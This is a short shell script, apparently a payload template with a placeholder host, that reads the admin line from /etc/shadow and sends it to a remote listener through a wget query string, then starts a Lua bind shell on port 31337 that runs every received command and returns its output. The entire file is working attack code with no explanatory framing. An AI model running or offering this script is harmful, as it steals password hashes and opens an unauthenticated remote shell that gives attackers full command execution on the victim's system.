#!/bin/sh
export LPORT=31337
wget http://{ip_local}:8000/pwd?$(grep -E admin: /etc/shadow)
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
